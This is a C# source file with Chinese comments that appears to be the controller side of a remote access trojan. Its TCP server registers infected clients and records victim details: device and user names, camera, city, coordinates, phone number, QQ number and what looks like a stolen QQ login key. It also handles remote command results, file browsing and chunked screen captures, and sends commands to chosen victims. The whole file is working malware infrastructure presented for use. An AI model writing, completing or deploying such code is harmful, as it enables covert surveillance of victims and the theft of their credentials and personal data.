using Data;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

public class TCPServer
{
    private TcpListener tcpListener;
    private ConcurrentDictionary<string, TcpClient> clients; // 客户端管理字典

    public TCPServer(string ipAddress, int port)
    {
        clients = new ConcurrentDictionary<string, TcpClient>();
        IPAddress ip = IPAddress.Parse(ipAddress);
        tcpListener = new TcpListener(ip, port);
    }

    public async Task Start()
    {
        tcpListener.Start();
        Log.AddLog($"服务器启动，监听于 {tcpListener.LocalEndpoint}", "#32CD32");

        try
        {
            while (true)
            {
                TcpClient client = await tcpListener.AcceptTcpClientAsync();
                Console.WriteLine($"客户端连接：{client.Client.RemoteEndPoint}");
                Log.AddLog($"客户端连接：{client.Client.RemoteEndPoint}", "#32CD32");
                
                clients.TryAdd(client.Client.RemoteEndPoint.ToString(), client);

                _ = HandleClientCommunicationAsync(client);
            }
        }
        catch (Exception ex)
        {
            Log.AddLog($"Start 方法中出现异常：{ex.Message}","#B22222");
            Console.WriteLine($"Start 方法中出现异常：{ex.Message}");
        }
    }

    private async Task HandleClientCommunicationAsync(TcpClient client)
    {
        try
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[65536];
            int bytesRead;

            // 缓冲区，用于存储不完整的数据
            StringBuilder incompleteDataBuffer = new StringBuilder();

            while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) > 0)
            {
                string data = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                incompleteDataBuffer.Append(data);

                string combinedData = incompleteDataBuffer.ToString();

                //判断是否粘包
                var packets = combinedData.Split(new string[] { "[A]" }, StringSplitOptions.None);
                for (int i = 0; i < packets.Length - 1; i++)
                {
                    await ProcessDataAsync(client, packets[i]);
                    if (packets[i].Length > 500)
                    {
                        Log.AddLog($"从 {client.Client.RemoteEndPoint} 收到数据 长度：{packets[i].Length}", "#FF6A6A");
                    }
                    else
                    {
                        Log.AddLog($"从 {client.Client.RemoteEndPoint} 收到数据：{packets[i]}", "#FF6A6A");
                    }
                }

                if (!combinedData.Contains("[A]"))
                {
                    Log.AddLog($"从 {client.Client.RemoteEndPoint} 收到不规范数据：{combinedData}", "#FF6A6A");
                }
                // 将最后一个数据包保留在缓冲区中 防止断包
                incompleteDataBuffer.Clear();
                incompleteDataBuffer.Append(packets.Last());

                Array.Clear(buffer, 0, buffer.Length);
            }

        }
        catch (Exception ex)
        {
            Log.AddLog($"HandleClientCommunicationAsync 方法中出现异常：{ex.Message}","#B22222");
            Console.WriteLine($"HandleClientCommunicationAsync 方法中出现异常：{ex.Message}");
        }
        finally
        {
            clients.TryRemove(client.Client.RemoteEndPoint.ToString(), out _);
            Log.AddLog($"客户端断开连接 {client.Client.RemoteEndPoint.ToString()}","#B22222");
            MainData.DeleteDevice(client.Client.RemoteEndPoint.ToString());
            Console.WriteLine($"客户端断开连接");
        }
    }
     Dictionary<int, string> receivedData = new Dictionary<int, string>();
    int totalChunks = 0;
    private async Task ProcessDataAsync(TcpClient client, string data)
    {
        var cmds = data.Split("|||");
        switch (cmds[0])
        {
            case "INFO":
                MainData.DeviceL.Add(new Device()
                {
                    DeviceName = cmds[1].Replace("DNAME-", ""),
                    UserName = cmds[2].Replace("UNAME-", ""),
                    IP = client.Client.RemoteEndPoint.ToString(),
                    City = cmds[6].Replace("CITY-", ""),
                    CameraDevice = cmds[4].Replace("CNAME-", ""),
                    InstallTime = cmds[5].Replace("DATE-", ""),
                    LoaderName = cmds[3].Replace("PNAME-", ""),
                    QQNumber = cmds[8].Replace("QQ-", ""),
                    ProcessID = cmds[7].Replace("PID-", ""),
                    XY = cmds[9].Replace("XY-", ""),
                    PhoneNumber = cmds[10].Replace("PHONE-", ""),
                    QQKey = cmds[11].Replace("KEY-", ""),
                    KeyType = cmds[12].Replace("KEYTYPE-", "")
                });
                break;
            case "BCMD":
                //DOS.addResult(cmds[1]);
                break;
            case "BFILES":
                //FileExplorer.LoadClientFolder(data.Replace("BFILES|||", ""));
                break;
            case "BSM":
                var parts = data.Split("|||");

                if(parts[1] == "END")// ||| receivedData.Count == totalChunks
                {
                    var fullBase64 = string.Join("", receivedData.OrderBy(x => x.Key).Select(x => x.Value));
                    fullBase64.Replace("\r", "").Replace("\n", "");

                    //await ScreenMonitor.SetFrameWebViewAsync(fullBase64);
                    //ScreenMonitor.SetFrame(fullBase64);
                    System.IO.File.WriteAllText($"Images\\all.txt", fullBase64);
                    Log.AddLog($"从 {client.Client.RemoteEndPoint}接收数据完成 共[{totalChunks}]片 大小[{fullBase64.Length}]", "ForestGreen");
                }
                else //if(data.Length > 3000)
                {

                    int chunkIndex = int.Parse(parts[1]);
                    totalChunks = int.Parse(parts[2]);
                    string base64Data = parts[3];
                    receivedData[chunkIndex] = base64Data;
                    System.IO.File.WriteAllText($"Images\\{chunkIndex}.txt", data);
                    Log.AddLog($"从 {client.Client.RemoteEndPoint} 收到分片数据：{chunkIndex}/{totalChunks} | {base64Data.Length}", "#FF6A6A");
                }
                //else
                //{
                //    Log.AddLog($"从 {client.Client.RemoteEndPoint}接收到无效帧数据","#B22222");
                //}

                break;
            case "BDL":
                break;
            default:
                break;
        }
        //await SendDataAsync(client, data);
    }


    private async Task SendDataAsync(TcpClient client, string data)
    {
        try
        {
            byte[] buffer = Encoding.UTF8.GetBytes(data);
            NetworkStream stream = client.GetStream();
            Debug.WriteLine($"发送 {data}");
            await stream.WriteAsync(buffer, 0, buffer.Length);
        }
        catch (Exception ex)
        {
            Log.AddLog($"SendDataAsync 方法中出现异常：{ex.Message}","#B22222");
            Console.WriteLine($"SendDataAsync 方法中出现异常：{ex.Message}");
        }

       
    }

    // 发送数据给指定客户端的函数
    public async Task SendDataToClientAsync(string clientIdentifier, string data)
    {
        if (clients.TryGetValue(clientIdentifier, out TcpClient client))
        {
            await SendDataAsync(client, data+ "[A]");
            Log.AddLog($"准备为{clientIdentifier}发送标头为[{data.Split("|")[0]}]大小为[{(data + "[A]").Length}]的数据", "#32CD32");
        }
        else
        {
            Log.AddLog($"未找到客户端：{clientIdentifier}","#B22222");
            Debug.WriteLine($"未找到客户端：{clientIdentifier}");
        }
    }
}
